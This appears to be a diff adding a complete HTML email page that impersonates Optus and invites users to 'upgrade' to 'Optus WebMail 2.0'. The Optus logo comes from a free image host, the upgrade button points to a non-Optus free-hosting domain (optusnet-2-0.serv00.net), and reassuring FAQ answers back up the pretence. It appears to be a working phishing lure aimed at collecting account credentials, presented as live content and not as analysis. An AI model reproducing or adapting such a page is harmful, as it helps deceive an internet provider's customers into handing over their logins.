@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Upgrade to Optus WebMail 2.0</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f0f0;
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            max-width: 600px;
+            margin: 50px auto;
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            padding: 20px;
+        }
+        .header {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .header img {
+            max-width: 150px;
+        }
+        h1 {
+            color: #444444;
+        }
+        .content {
+            line-height: 1.6;
+        }
+        .btn {
+            display: block;
+            width: 200px;
+            margin: 20px auto;
+            padding: 10px;
+            background-color: #FEDC00;
+            color: white;
+            text-align: center;
+            text-decoration: none;
+            border-radius: 5px;
+        }
+        .faq {
+            margin-top: 30px;
+            border-top: 1px solid #ddd;
+            padding-top: 20px;
+        }
+        .faq h2 {
+            color: #444444;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <img src="https://iili.io//dfqJrR2.png" alt="Optus Logo">
+            <h1>Welcome to Optus WebMail 2.0!</h1>
+        </div>
+        <div class="content">
+            <p>We're excited to offer you an improved email experience. Click below to upgrade your account:</p>
+            <a href="https://optusnet-2-0.serv00.net" class="btn">Upgrade My Account</a>
+        </div>
+        <div class="faq">
+            <h2>Frequently Asked Questions</h2>
+            <p><strong>Q: Will I lose my emails during the upgrade?</strong><br>
+            A: No, all your existing emails and contacts will be preserved.</p>
+            <p><strong>Q: How long will the upgrade take?</strong><br>
+            A: The upgrade process typically takes only a few minutes.</p>
+            <p><strong>Q: Will my email address change?</strong><br>
+            A: No, your email address will remain the same.</p>
+        </div>
+    </div>
+</body>
+</html>
